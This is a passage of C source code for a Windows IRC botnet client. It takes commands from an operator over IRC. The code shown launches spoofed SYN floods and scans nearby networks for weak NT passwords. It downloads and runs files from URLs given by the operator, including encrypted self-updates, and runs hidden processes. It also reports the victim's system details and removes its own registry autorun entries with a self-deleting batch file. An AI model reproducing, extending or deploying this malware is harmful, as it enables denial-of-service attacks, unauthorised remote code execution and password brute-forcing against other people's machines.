				testip=inet_addr(a[s+1]);
				if (testip!=INADDR_NONE) {
					if (bSpoofable==FALSE) {
						SniffOnAllAdapters();
						testSpoofCapable(testip,ourip);
					} else {
						if (!silent) irc_privmsg(sock,a[2],"We can spoof :)",notice);
					}
				}
			}

			else if (strcmp("nick", a[s]) == 0 || strcmp("n", a[s]) == 0) {
				irc_sendf(sock, "NICK %s\r\n", a[s+1]);
			}
			else if (strcmp("join", a[s]) == 0 || strcmp("j", a[s]) == 0) {
				irc_sendf2(sock, "JOIN %s %s\r\n", a[s+1], a[s+2]);
			}
			else if (strcmp("part", a[s]) == 0 || strcmp("pt", a[s]) == 0) {
				irc_sendf(sock, "PART %s\r\n", a[s+1]);
			}
			else if (strcmp("raw", a[s]) == 0 || strcmp("r", a[s]) == 0) {
				if (x != NULL) {
					char *y = strstr(x, a[s+1]);
					if (y != NULL) irc_send(sock, y);
				}
			}
			else if (strcmp("killthread", a[s]) == 0 || strcmp("k", a[s]) == 0) {
				BOOL threadkilled = FALSE;
				int n,j;
				n=(sizeof(a)/4);
				for (i=s;i<n;i++) {
					if (a[i]==NULL) break;
					j=atoi(a[i]);
					if ((j>0) && (j<64)) {
						TerminateThread(threads[j], 0);
						if (threads[j] != 0) threadkilled = TRUE;
						threads[j] = 0;
						threadd[j][0] = '\0';
						cnick[j][0] = '\0';
						closesocket(csock[j]);
					}
				}
				if (!silent) if (threadkilled) irc_privmsg(sock, a[2], "thread(s) killed.", notice);
			}
			else if (strcmp("c_quit", a[s]) == 0 || strcmp("c_q", a[s]) == 0) {
				if (atoi(a[s+1]) > 0 && atoi(a[s+1]) < 65) {
					irc_send(csock[atoi(a[s+1])], "QUIT :later");
					Sleep(500);
					closesocket(csock[atoi(a[s+1])]);
					TerminateThread(threads[atoi(a[s+1])], id);
					threads[atoi(a[s+1])] = 0;
					threadd[atoi(a[s+1])][0] = '\0';
				}
			}
			else if (strcmp("c_rndnick", a[s]) == 0 || strcmp("c_rn", a[s]) == 0) {
				if (atoi(a[s+1]) > 0 && atoi(a[s+1]) < 65) {
					sprintf(sendbuf, "NICK %s", rndnick(ntmp));
					irc_send(csock[atoi(a[s+1])], sendbuf);
				}
			}
			else if (strcmp("prefix", a[s]) == 0 || strcmp("pr", a[s]) == 0) prefix1 = a[s+1][0];
			else if (strcmp("open", a[s]) == 0 || strcmp("o", a[s]) == 0) {
				if (ShellExecute(0, "open", a[s+1], NULL, NULL, SW_SHOW)) {
					if (!silent) irc_privmsg(sock, a[2], "file opened.", notice);
				} else {
					if (!silent) irc_privmsg(sock, a[2], "couldn't open file.", notice);
				}
			}
			else if (strcmp("server", a[s]) == 0 || strcmp("se", a[s]) == 0) {
				strncpy(server,  a[s+1], 127);
			}
			else if (strcmp("dns", a[s]) == 0 || strcmp("dn", a[s]) == 0) {
				HOSTENT *hostent = NULL;
				IN_ADDR iaddr;
				DWORD addr = inet_addr(a[s+1]);

				if (addr != INADDR_NONE) {
					hostent = gethostbyaddr((char *)&addr, sizeof(struct in_addr), AF_INET);
					if (hostent != NULL) {
						sprintf(sendbuf, "%s -> %s", a[s+1], hostent->h_name);
					  	irc_privmsg(sock, a[2], sendbuf, notice);
					}
				}
				else {
					hostent = gethostbyname(a[s+1]);
					if (hostent != NULL) {
						iaddr = *((LPIN_ADDR)*hostent->h_addr_list);
						sprintf(sendbuf, "%s -> %s", a[s+1], inet_ntoa(iaddr));
						irc_privmsg(sock, a[2], sendbuf, notice);
					}
				}
				if (hostent == NULL) irc_privmsg(sock, a[2], "couldn't resolve host", notice);
	
			}

			// commands requiring at least 2 parameters
			else if (a[s+2] == NULL) return 1;
			else if (strcmp("ntscan",a[s])==0) {
				if (ntscan==TRUE) {
					if (!silent) irc_privmsg(sock,a[2],"Ntscan: Already scanning. Use ntstop",notice);
				} else {
					DWORD pthreads,minutes;
					pthreads=strtoul(a[s+1],0,10);
					minutes=strtoul(a[s+2],0,10);
					if (pthreads>100) pthreads=100;
					if (pthreads<=0) pthreads=1;
					if (minutes>120) minutes=120;
					if (minutes<=0) minutes=1;

					if (!silent) irc_privmsg(sock,a[2],"Scanning ntpass now",notice);
					NTSCAN *ns;
					ns=(NTSCAN *)malloc(sizeof(NTSCAN));
					ns->minutes=minutes;
					ns->threads=pthreads;
					i=addthread("NTScan");
					ns->threadid=i;
					if (a[s+3]) {
						strcpy(ns->ipmask,a[s+3]);
					}
					if (parmenters['a']) {
						//We need to take *SELF* ip and scan near this :P..
						int sin_size;
						SOCKADDR_IN sin;
						char *c;
						sin_size=sizeof(SOCKADDR_IN);
						getsockname(sock,(SOCKADDR*)&sin,&sin_size);
						sin.sin_addr.S_un.S_addr&=(parmenters['b']==0) ? 0xFFFFFF : 0xFFFF;
						strcpy(ns->ipmask,inet_ntoa(sin.sin_addr));
						if (parmenters['b']==0) {
							// remove only last dot
							c=strrchr(ns->ipmask,'.');
							if (c) c[0]=0;
						} else {
							c=strchr(ns->ipmask,'.');
							if (c) {
								c=strchr(c+1,'.');
								if (c) {
									c[0]=0;
								}
							}
						}
					}

					threads[i]=CreateThread(0,0,&ntpass_main,ns,0,0);
				}
			}
			else if (strcmp("syn",a[s])==0) {
				// $syn <ip> <port> <seconds|amount> <source ip> <source port> <+rand>
				synflood *sf;

				if ((bSpoofable==TRUE) || (parmenters['f'])) {
					sf=(synflood *)malloc(sizeof(synflood));
					if (strcmp(a[s+1],"0")==0) {
						sf->remoteHost=0;
					} else {
						sf->remoteHost=inet_addr(a[s+1]);
						if (sf->remoteHost==INADDR_NONE) {
							if (!silent) irc_privmsg(sock,a[2],"Error: Can't resolve host",notice);
							return 1;
						}
					}
					sf->remotePort=0;
					sf->remotePort=atoi(a[s+2]);
					if (parmenters['t']) {
						sf->seconds=60;		//-t parmenter - (Time - seconds)
						if (a[s+3]) sf->seconds=atoi(a[s+3]);
						sf->amount=0;
					} else {
						sf->amount=1000;	// no -t parmenter - assume its amount...
						if (a[s+3]) sf->amount=atoi(a[s+3]);
						sf->seconds=0;
					}
					sf->sourceIP=0;
					if (a[s+4]) {
						sf->sourceIP=inet_addr(a[s+4]);
						if (sf->sourceIP==INADDR_NONE) sf->sourceIP=0;
					}
					sf->sport=0;
					if (a[s+5]) sf->sport=atoi(a[s+5]);
					sf->rand=0;
					if (a[s+6]) sf->rand=atoi(a[s+6]);

					sprintf(buff,"Syn %s",a[s+1]);
					i=addthread(buff);
					DWORD ThreadID;
					sf->threadnum=i;
					threads[i]=CreateThread(0,0,&SynTarget,sf,0,&ThreadID);
					

					if (!silent) irc_privmsg(sock,a[2],"Sending syns",notice);
					//MARKER
				//} else {
				//	if (!silent) irc_privmsg(sock,a[2],"Syn: We CANT spoof",notice);
				}
				
				
			}
			else if (strcmp("addalias", a[s]) == 0 || strcmp("aa", a[s]) == 0) {
				if (x != NULL) {
					char *y = strstr(x, a[s+2]);
					if (y != NULL) addalias(a[s+1], y);
				}
			}
			else if (strcmp("privmsg", a[s]) == 0 || strcmp("pm", a[s]) == 0) {
				if (x != NULL) {
					x = x + strlen(a[s]) + strlen(a[s+1]) + 2;
					char *y = strstr(x, a[s+2]);
					if (y != NULL) irc_privmsg(sock, a[s+1], y, FALSE);
				}
			}
			else if (strcmp("action", a[s]) == 0 || strcmp("a", a[s]) == 0) {
				if (x != NULL) {
					x = x + strlen(a[s]) + strlen(a[s+1]) + 2;
					char *y = strstr(x, a[s+2]);
					if (y != NULL) {
						sprintf(sendbuf, "\1ACTION %s\1", y);
						irc_privmsg(sock, a[s+1], sendbuf, FALSE);
					}
				}
			}
			else if (strcmp("cycle", a[s]) == 0 || strcmp("cy", a[s]) == 0) {
				if (strcmp("332", a[1]) == 0) return 1;
				irc_sendf(sock, "PART %s\r\n", a[s+2]);
				Sleep(atoi(a[s+1])*1000);
				irc_sendf2(sock, "JOIN %s %s\r\n", a[s+2], a[s+3]);
			}
			else if (strcmp("mode", a[s]) == 0 || strcmp("m", a[s]) == 0) {
				if (x != NULL) {
					char *y = strstr(x, a[s+1]);
					if (y != NULL) irc_sendf(sock, "MODE %s\r\n", y);
				}
			}
			else if (strcmp("repeat", a[s]) == 0 || strcmp("rp", a[s]) == 0) {
				if (strcmp("332", a[1]) == 0) return 1;
				if (x != NULL) {
					char *r = strstr(x, a[s+2]);
					sprintf(sendbuf, "%s %s %s :%s", a[0], a[1], a[2], r);
					strncpy(line,  sendbuf, 511);
					if (atoi(a[s+1]) > 0) return repeat + atoi(a[s+1]); else return repeat;
				}
			}
			else if (strcmp("c_raw", a[s]) == 0 || strcmp("c_r", a[s]) == 0) {
				if (x != NULL) {
					char *y = strstr(x, a[s+2]);
					if (y != NULL && atoi(a[s+1]) > 0 && atoi(a[s+1]) < 65) irc_send(csock[atoi(a[s+1])], y);
				}
			}
			else if (strcmp("c_mode", a[s]) == 0 || strcmp("c_m", a[s]) == 0) {
				if (x != NULL) {
					char *y = strstr(x, a[s+2]);
					if (y != NULL) sprintf(sendbuf, "MODE %s", y);
					if (atoi(a[s+1]) > 0 && atoi(a[s+1]) < 65) irc_send(csock[atoi(a[s+1])], sendbuf);
				}
			}
			else if (strcmp("c_nick", a[s]) == 0 || strcmp("c_n", a[s]) == 0) {
				sprintf(sendbuf, "NICK %s", a[s+2]);
				if (atoi(a[s+1]) > 0 && atoi(a[s+1]) < 65) irc_send(csock[atoi(a[s+1])], sendbuf);
			}
			else if (strcmp("c_join", a[s]) == 0 || strcmp("c_j", a[s]) == 0) {
				sprintf(sendbuf, "JOIN %s %s", a[s+2], a[s+3]);
				if (atoi(a[s+1]) > 0 && atoi(a[s+1]) < 65) irc_send(csock[atoi(a[s+1])], sendbuf);
			}
			else if (strcmp("c_part", a[s]) == 0 || strcmp("c_p", a[s]) == 0) {
				sprintf(sendbuf, "PART %s", a[s+2]);
				if (atoi(a[s+1]) > 0 && atoi(a[s+1]) < 65) irc_send(csock[atoi(a[s+1])], sendbuf);
			}
			else if (strcmp("repeat", a[s]) == 0 || strcmp("rp", a[s]) == 0) {
				if (strcmp("332", a[1]) == 0) return 1;
				if (x != NULL) {
					char *r = strstr(x, a[s+2]);
					sprintf(sendbuf, "%s %s %s :%s", a[0], a[1], a[2], r);
					strncpy(line,  sendbuf, 511);
					if (atoi(a[s+1]) > 0) return repeat + atoi(a[s+1]); else return repeat;
				}
			}
			else if (strcmp("delay", a[s]) == 0 || strcmp("de", a[s]) == 0) {
				if (strcmp("332", a[1]) == 0) return 1;
				if (x != NULL) {
					char *r = strstr(x, a[s+2]);
					sprintf(sendbuf, "%s %s %s :%s", a[0], a[1], a[2], r);
					strncpy(line,  sendbuf, 511);
					if (atoi(a[s+1]) > 0) Sleep(atoi(a[s+1])*1000);
					return repeat + 1;
				}
			}
			#ifndef NO_DOWNLOAD
			else if (strcmp("update", a[s]) == 0 || strcmp("up", a[s]) == 0) {
				if (strcmp(botid, a[s+2]) == 0) return 1;
				ds ds;
				sprintf(ds.dest, "%s\\%s.exe", tempdir, nick);
				strncpy(ds.url,  a[s+1], sizeof(ds.url)-1);
				ds.run = 0;
				ds.sock = sock;
				strncpy(ds.chan,  a[2], sizeof(ds.chan)-1);
				sprintf(sendbuf, "update (%s)", ds.url);
				ds.threadnum = addthread(sendbuf);
				ds.update = 1;
				ds.silent = silent;
				ds.notice=notice;
				ds.expectedcrc=0;
				ds.filelen=0;
				if (a[s+3]) ds.expectedcrc=strtoul(a[s+3],0,16);
				if (a[s+4]) ds.filelen=atoi(a[s+4]);
				ds.encrypted=(parmenters['e']);
				threads[ds.threadnum] = CreateThread(NULL, 0, &webdownload, (void *)&ds, 0, &id);
				sprintf(sendbuf, "downloading update from %s...\r\n", a[s+1]);
				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				while(1) {
					if (ds.gotinfo == TRUE) break;
					Sleep(50);
				}
			}
			#endif
			else if (strcmp("execute", a[s]) == 0 || strcmp("e", a[s]) == 0) {
				PROCESS_INFORMATION pinfo;
				STARTUPINFO sinfo;
				memset(&sinfo, 0, sizeof(STARTUPINFO));
				sinfo.cb = sizeof(sinfo);
				sinfo.dwFlags = STARTF_USESHOWWINDOW;
				sinfo.wShowWindow=SW_HIDE;
				if (atoi(a[s+1]) == 1) sinfo.wShowWindow=SW_SHOW;
				if (x != NULL) {
					char *y = strstr(x, a[s+2]);
					if (y != NULL) if (!CreateProcess(NULL, y, NULL, NULL, TRUE, NORMAL_PRIORITY_CLASS | DETACHED_PROCESS, NULL, NULL, &sinfo, &pinfo) && !silent) irc_privmsg(sock, a[2], "couldn't execute file.", notice);
				}
			}
			// commands requiring at least 3 parameters
			else if (a[s+3] == NULL) return 1;
			else if (strcmp("clone", a[s]) == 0 || strcmp("c", a[s]) == 0) {
				ircs irc;
				strncpy(irc.host,  a[s+1], sizeof(irc.host)-1);
				irc.port = atoi(a[s+2]);
				strncpy(irc.channel,  a[s+3], sizeof(irc.channel)-1);
				if (a[s+4] != NULL) strncpy(irc.chanpass,  a[s+4], sizeof(irc.chanpass)-1);
				sprintf(sendbuf, "clone (%s)", irc.host);
				irc.threadnum = addthread(sendbuf);
				if (!silent) {
					sprintf(sendbuf, "clone created on %s:%d, in channel %s.\r\n", irc.host, irc.port, irc.channel);
					irc_privmsg(sock, a[2], sendbuf, notice);
				}
				threads[irc.threadnum] = CreateThread(NULL, 0, &irc_connect, (void *)&irc, 0, &id);
				while(1) {
					if (irc.gotinfo == TRUE) break;
					Sleep(50);
				}
			}
			#ifndef NO_DOWNLOAD
			else if (strcmp("download", a[s]) == 0 || strcmp("dl", a[s]) == 0) {
				ds ds;
				strncpy(ds.url,  a[s+1], sizeof(ds.url)-1);
				strncpy(ds.dest,  a[s+2], sizeof(ds.dest)-1);
				if (a[s+3] != NULL) ds.run = atoi(a[s+3]); else ds.run = 0;
				ds.sock = sock;
				strncpy(ds.chan,  a[2], sizeof(ds.chan)-1);
				sprintf(sendbuf, "download (%s)", ds.url);
				ds.threadnum = addthread(sendbuf);
				ds.update = 0;
				ds.silent = silent;
				ds.notice=notice;
				ds.expectedcrc=0;
				ds.filelen=0;
				ds.encrypted=(parmenters['e']);
				if (a[s+4]) ds.expectedcrc=strtoul(a[s+4],0,16);		//CRC check..
				if (a[s+5]) ds.filelen=atoi(a[s+5]);
				threads[ds.threadnum] = CreateThread(NULL, 0, &webdownload, (void *)&ds, 0, &id);
				if (!silent) {
					sprintf(sendbuf, "downloading %s...\r\n", a[s+1]);
					irc_privmsg(sock, a[2], sendbuf, notice);
				}
				while(1) {
					if (ds.gotinfo == TRUE) break;
					Sleep(50);
				}
			}
			#endif

			else if (strcmp("c_privmsg", a[s]) == 0 || strcmp("c_pm", a[s]) == 0) {
				if (cnick[atoi(a[s+1])][0] != '\0' && x != NULL) {
					x = x + strlen(a[s]) + strlen(a[s+1]) + strlen(a[s+2]) + 2;
					char *y = strstr(x, a[s+3]);
					if (y != NULL && atoi(a[s+1]) > 0 && atoi(a[s+1]) < 65) {
						irc_privmsg(csock[atoi(a[s+1])], a[s+2], y, FALSE);
						if (threadd[atoi(a[s+1])][0] == 's') {
							sprintf(sendbuf, "[%s] <%s> %s", a[s+2], cnick[atoi(a[s+1])], y);
							irc_privmsg(sock, a[2], sendbuf, notice);
						}
					}
				}
			}
			else if (strcmp("c_action", a[s]) == 0 || strcmp("c_a", a[s]) == 0) {
				if (cnick[atoi(a[s+1])][0] != '\0' && x != NULL) {
					x = x + strlen(a[s]) + strlen(a[s+1]) + strlen(a[s+2]) + 2;
					char *y = strstr(x, a[s+3]);
					sprintf(sendbuf, "\1ACTION %s\1", y);
					if (y != NULL && atoi(a[s+1]) > 0 && atoi(a[s+1]) < 65) {
						irc_privmsg(csock[atoi(a[s+1])], a[s+2], sendbuf, FALSE);
						if (threadd[atoi(a[s+1])][0] == 's') {
							sprintf(sendbuf, "[%s] * %s %s", a[s+2], cnick[atoi(a[s+1])], y);
							irc_privmsg(sock, a[2], sendbuf, notice);
						}
					}
				}
			}
			// commands requiring at least 4 parameters
			else if (a[s+4] == NULL) return 1;

		
		
		}
	}
	return repeat;
 }




// irc send functions
 void irc_send(SOCKET sock, char *msg)
 {
	char msgbuf[512];

	memset(msgbuf, 0, sizeof(msgbuf));
	sprintf(msgbuf, "%s\r\n", msg);
	send(sock, msgbuf, strlen(msgbuf), 0);
 }


 void irc_sendf(SOCKET sock, char *msg, char *str)
 {
	char msgbuf[512];

	memset(msgbuf, 0, sizeof(msgbuf));
	sprintf(msgbuf, msg, str);
	send(sock, msgbuf, strlen(msgbuf), 0);
 }

 void irc_sendf2(SOCKET sock, char *msg, char *str, char *str2)
 {
	char msgbuf[512];

	memset(msgbuf, 0, sizeof(msgbuf));
	sprintf(msgbuf, msg, str, str2);
	send(sock, msgbuf, strlen(msgbuf), 0);
 }

 void irc_privmsg(SOCKET sock, char *dest, char *msg, BOOL notice)
 {
	char msgbuf[512];
	char *action;

	memset(msgbuf, 0, sizeof(msgbuf));
	if (notice) action = "NOTICE"; else action = "PRIVMSG";
	sprintf(msgbuf, "%s %s :%s\r\n", action, dest, msg);
	send(sock, msgbuf, strlen(msgbuf), 0);
 }

// search-and-replace function for strings
 char * replacestr(char *str, char *oldstr, char *newstr)
 {
	char *p;
	char str2[512];
	char str3[512];
	char str4[512];

	memset(str2, 0, sizeof(str2));
	memset(str3, 0, sizeof(str3));
	memset(str4, 0, sizeof(str4));
	strncpy(str2,  str, sizeof(str2)-1);
	if (strlen(newstr) > 384) newstr[384] = '\0';

	while (strstr(str2, oldstr) != NULL) {
		p = strstr(str2, oldstr);
		strncpy(str4,  p + strlen(oldstr), sizeof(str4)-1);
		p[0] = '\0';
		strncpy(str3,  str2, sizeof(str3)-1);
		if (p+1 != NULL && oldstr-1 != NULL) if (strlen(p+1) > strlen(oldstr-1)) sprintf(str2, "%s%s%s", str3, newstr, str4);
		 else sprintf(str2, "%s%s", str3, newstr);
		if (strstr(oldstr, newstr) != NULL) break;
	}
	strncpy(str,  str2, strlen(str2)+1);
	return str;
 }

 


 #ifndef NO_DOWNLOAD
// function for downloading files/updating
 DWORD WINAPI webdownload(LPVOID param)
 {
	char fbuff[512];
	char tstr[256];
	HANDLE fh, f;
	DWORD r, d, start, total, speed;
	PROCESS_INFORMATION pinfo;
	STARTUPINFO sinfo;
	ds dl;
	dl = *((ds *)param);
	ds *dsp = (ds *)param;
	dsp ->gotinfo = TRUE;
	fh = InternetOpenUrl(ih, dl.url, NULL, 0, 0, 0);
	if (fh != NULL) {

		// open the file
		f = CreateFile(dl.dest, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, 0);
		// make sure that our file handle is valid
		if (f < (HANDLE)1) {
			if (!dl.silent) {
				sprintf(fbuff,"couldn't open %s.",dl.dest);
				irc_privmsg(dl.sock,dl.chan,fbuff,dl.notice);
			}
			threads[dl.threadnum] = 0;
			threadd[dl.threadnum][0] = '\0';
			return 0;
		}

		total = 0;
		start = GetTickCount();

		char *fileTotBuff=(char *)malloc(512000);	//FIXME: Only checks first 500 kb
		do {
			memset(fbuff, 0, sizeof(fbuff));
			InternetReadFile(fh, fbuff, sizeof(fbuff), &r);
			if (dl.encrypted==TRUE) {
				Xorbuff(fbuff,r);
			}
			WriteFile(f, fbuff, r, &d, NULL);
			
			if ((total) < 512000)
			{
				//We have free bytes...
				//512000-total
				int bytestocopy;
				bytestocopy=512000-total;
				if (bytestocopy>r) bytestocopy=r;
				memcpy(&fileTotBuff[total],fbuff,bytestocopy);
			}
			total+=r;
			if (dl.filelen) if (total>dl.filelen) break; //er, we have a problem... filesize is too big.
			if (dl.update != 1) sprintf(threadd[dl.threadnum], "file download (%s - %dkb transferred)", dl.url, total / 1024);
			 else sprintf(threadd[dl.threadnum], "update (%s - %dkb transferred)", dl.url, total / 1024);
		} while (r > 0);

		BOOL goodfile=TRUE;

		if (dl.filelen) {
			if (total!=dl.filelen) {
				goodfile=FALSE;
				sprintf(tstr,"Filesize is INCORRECT!!");
				irc_privmsg(dl.sock,dl.chan,tstr,dl.notice);
			}
		}

		speed = total / (((GetTickCount() - start) / 1000) + 1);

		CloseHandle(f);

		if (dl.expectedcrc) {
			unsigned long crc,crclength;
			sprintf(fbuff,"crc32([%lu], [%d])\n",fileTotBuff,total);
			crclength=total;
			if (crclength>512000) crclength=512000;
			crc=crc32(fileTotBuff,crclength);
			if (crc!=dl.expectedcrc) {
				goodfile=FALSE;
				irc_privmsg(dl.sock,dl.chan,"CRC Failed!",dl.notice);
			}
			
		}
		free(fileTotBuff);



		if (goodfile==FALSE) goto badfile;

		
		//download isn't an update
		if (dl.update != 1) {
			sprintf(tstr, "downloaded %.1f kb to %s @ %.1f kb/sec.", total / 1024.0, dl.dest, speed / 1024.0);
			if (!dl.silent) irc_privmsg(dl.sock, dl.chan, tstr, dl.notice);

			if (dl.run == 1) {
				ShellExecute(0, "open", dl.dest, NULL, NULL, SW_SHOW);
				if (!dl.silent) {
					sprintf(fbuff,"opened %s.",dl.dest);
					irc_privmsg(dl.sock,dl.chan,fbuff,dl.notice);
				}
			}

		// download is an update
		} else {
			sprintf(tstr, "downloaded %.1f kb to %s @ %.1f kb/sec. updating...", total / 1024.0, dl.dest, speed / 1024.0);
			if (!dl.silent) irc_privmsg(dl.sock, dl.chan, tstr, dl.notice);

			memset(&sinfo, 0, sizeof(STARTUPINFO));
			sinfo.cb = sizeof(sinfo);
			sinfo.wShowWindow = SW_HIDE;
			if (CreateProcess(NULL, dl.dest, NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS | DETACHED_PROCESS, NULL, NULL, &sinfo, &pinfo) == TRUE) {
				uninstall();
				WSACleanup();
				exit(0);
			} else {
				if (!dl.silent) irc_privmsg(dl.sock, dl.chan, "update failed: error executing file.", dl.notice);
			}
		}
	} else if (!dl.silent) irc_privmsg(dl.sock, dl.chan, "bad url, or dns error.", dl.notice);
badfile:
	InternetCloseHandle(fh);

	threads[dl.threadnum] = 0;
	threadd[dl.threadnum][0] = '\0';
	return 0;
 }
 #endif
 
 #ifndef NO_NETINFO
// function used for netinfo
 char * netinfo(char *ninfo, char *host, SOCKET sock)
 {

	SOCKADDR sa;
	int sas;
	DWORD n;
	char ctype[8];
	char cname[128];

	// get connection type/name
	memset(cname, 0, sizeof(cname));
	memset(ctype, 0, sizeof(ctype));
	if (!noigcse) {
		fInternetGetConnectedStateEx(&n, (char *)&cname, sizeof(cname), 0);
    	if (n & INTERNET_CONNECTION_MODEM == INTERNET_CONNECTION_MODEM) strncpy(ctype,  "dial-up", sizeof(ctype)-1);
	 	else strncpy(ctype,  "LAN", sizeof(ctype)-1);
	} else {
		strncpy(ctype, "N/A", sizeof(ctype)-1);
		strncpy(cname, "N/A", sizeof(cname)-1);
	}

	// get ip address
	sas = sizeof(sa);
	memset(&sa, 0, sizeof(sa));
	getsockname(sock, &sa, &sas);

	sprintf(ninfo, "connection type: %s (%s). local IP address: %d.%d.%d.%d. connected from: %s", ctype, cname, (BYTE)sa.sa_data[2], (BYTE)sa.sa_data[3], (BYTE)sa.sa_data[4], (BYTE)sa.sa_data[5], host);
	return ninfo; // return the netinfo string
 }
 #endif

 #ifndef NO_SYSINFO
// function used for sysinfo
 char * sysinfo(char *sinfo)
 {
	int total;
	MEMORYSTATUS memstat;
	OSVERSIONINFO verinfo;

	GlobalMemoryStatus(&memstat); // load memory info into memstat
	verinfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFO); // required for some strange reason
	GetVersionEx(&verinfo); // load version info into verinfo
	char *os;
	char os2[140];
	if (verinfo.dwMajorVersion == 4 && verinfo.dwMinorVersion == 0) {
		if (verinfo.dwPlatformId == VER_PLATFORM_WIN32_WINDOWS) os = "95";
		if (verinfo.dwPlatformId == VER_PLATFORM_WIN32_NT) os = "NT";
	}
	else if (verinfo.dwMajorVersion == 4 && verinfo.dwMinorVersion == 10) os = "98";
	else if (verinfo.dwMajorVersion == 4 && verinfo.dwMinorVersion == 90) os = "ME";
	else if (verinfo.dwMajorVersion == 5 && verinfo.dwMinorVersion == 0) os = "2000";
	else if (verinfo.dwMajorVersion == 5 && verinfo.dwMinorVersion == 1) os = "XP";
	else os = "???";

	if (verinfo.dwPlatformId == VER_PLATFORM_WIN32_NT && verinfo.szCSDVersion[0] != '\0') {
		sprintf(os2, "%s [%s]", os, verinfo.szCSDVersion);
		os = os2;
	}

	total = GetTickCount() / 1000; // GetTickCount() / 1000 = seconds since os started.

	sprintf(sinfo, "cpu: %dMHz. ram: %dKB total, %dKB free. os: Windows %s (%d.%d, build %d). uptime: %dd %dh %dm",
		cpuspeed(), memstat.dwTotalPhys / 1024, memstat.dwAvailPhys / 1024,
		os, verinfo.dwMajorVersion, verinfo.dwMinorVersion, verinfo.dwBuildNumber, total / 86400, (total % 86400) / 3600, ((total % 86400) % 3600) / 60);
	return sinfo; // return the sysinfo string
 }

// cpu speed function
 int cpuspeed(void)
 {
	unsigned __int64 startcycle;
	unsigned __int64 speed, num, num2;

	do {
		startcycle = cyclecount();
		Sleep(1000);
		speed = ((cyclecount()-startcycle)/100000)/10;
	} while (speed > 1000000); // if speed is 1000GHz+, then something probably went wrong so we try again =P

	// guess 'real' cpu speed by rounding raw cpu speed (something like 601mhz looks kinda tacky)
	num = speed % 100;
	num2 = 100;
	if (num < 80) num2 = 75;
	if (num < 71) num2 = 66;
	if (num < 55) num2 = 50;
	if (num < 38) num2 = 33;
	if (num < 30) num2 = 25;
	if (num < 10) num2 = 0;
	speed = (speed-num)+num2;

	return speed;
 }

// asm for cpuspeed() (used for counting cpu cycles)
 unsigned __int64 cyclecount(void)
 {
 	#if defined (__LCC__) // this code is for lcc
	unsigned __int64 count = 0;
	_asm ("rdtsc\n"
		  "mov %eax,%count\n");
	return count;

	#elif defined (__GNUC__) // this code is for GCC
	unsigned __int64 count = 0;
	__asm__ ("rdtsc;movl %%eax, %0" : "=r" (count));
	return count;

	#else // this code is for MSVC, may work on other compilers (ignore the warnings, MSVC is stupid...)
	_asm {
		_emit 0x0F;
		_emit 0x31;
	}
	#endif
 }
 #endif

 // function for removing the bot's registry entries and executable
 void uninstall(void)
 {
	HKEY key;
	HANDLE f;
	DWORD r;
	PROCESS_INFORMATION pinfo;
	STARTUPINFO sinfo;
	char cmdline[256];
	char tcmdline[256];
	char cfilename[256];
	char batfile[256];

	// remove our registry entries
	if (regrun) {
		RegCreateKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &key, NULL);
		RegDeleteValue(key, valuename);
		RegCloseKey(key);
	}

	if (regrunservices) {
		RegCreateKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\RunServices", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &key, NULL);
		RegDeleteValue(key, valuename);
		RegCloseKey(key);
	}

	sprintf(batfile, "%s\\r.bat", tempdir);
	f = CreateFile(batfile, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, 0);
	if (f > (HANDLE)0) {
		// write a batch file to remove our executable once we close
		WriteFile(f, "@echo off\r\n"
					 ":start\r\nif not exist \"\"%1\"\" goto done\r\n"
					 "del /F \"\"%1\"\"\r\n"
					 "del \"\"%1\"\"\r\n"
					 "goto start\r\n"
					 ":done\r\n"
					 "del /F %temp%\r.bat\r\n"
					 "del %temp%\r.bat\r\n", 105, &r, NULL);
		CloseHandle(f);

		memset(&sinfo, 0, sizeof(STARTUPINFO));
		sinfo.cb = sizeof(sinfo);
		sinfo.wShowWindow = SW_HIDE;

		GetModuleFileName(GetModuleHandle(NULL), cfilename, sizeof(cfilename));// get our file name
		sprintf(tcmdline, "%%comspec%% /c %s %s", batfile, cfilename); // build command line
		ExpandEnvironmentStrings(tcmdline, cmdline, sizeof(cmdline)); // put the name of the command interpreter into the command line

		// execute the batch file
		CreateProcess(NULL, cmdline, NULL, NULL, TRUE, NORMAL_PRIORITY_CLASS | DETACHED_PROCESS, NULL, NULL, &sinfo, &pinfo);
	}
 }



int Split(char *inStr, void *saveArray)
{
/*
This will change x0A & x0D into x00 and return line pointers in saveArray[].
*/
	int i,j,index;

	char *lines[MAX_LINES];

	memset(lines,0,sizeof(lines));

	j=strlen(inStr);
	if (j<1) return -1;
	index=0;

	lines[index++]=inStr;


	for (i=0;i<j;i++) if ((inStr[i]=='\x0A') || (inStr[i]=='\x0D')) inStr[i]='\x0';

	//Now that all cr/lf have been converted to NUL, save the pointers...

	for (i=0;i<j;i++) {
		if ((inStr[i]=='\x0') && (inStr[i+1]!='\x0')) {
			/* We will use the NUL as a guide :) */
			if (index<MAX_LINES) lines[index++]=&inStr[i+1]; else break;	//CHECK :: Recently modified
		}
	}


	if (saveArray!=0) memcpy(saveArray,lines,sizeof(lines));
	return index;
}

SOCKET TCPConnect(unsigned long ip, unsigned short port, int timeout_seconds)
{
	SOCKET s;
	SOCKADDR_IN sin;
	unsigned long blockcmd=1;
	timeval t;
	int i;
	FD_SET rset;
	s=socket(AF_INET,SOCK_STREAM,0);
	if (s==INVALID_SOCKET) return INVALID_SOCKET;

	sin.sin_family=AF_INET;
	sin.sin_addr.S_un.S_addr=ip;
	sin.sin_port=htons(port);

	ioctlsocket(s,FIONBIO,&blockcmd);
	
	connect(s,(LPSOCKADDR)&sin,sizeof(sin));
	

	FD_ZERO(&rset);
	FD_SET(s,&rset);

	t.tv_sec=timeout_seconds;
	t.tv_usec=0;
	i=select(0,0,&rset,0,&t);
	if (i<=0) {
		closesocket(s);
		return SOCKET_ERROR;
	}
	blockcmd=0;
	ioctlsocket(s,FIONBIO,&blockcmd);
	return s;
}

unsigned long ResolveAddress(char *Host)
{
/*
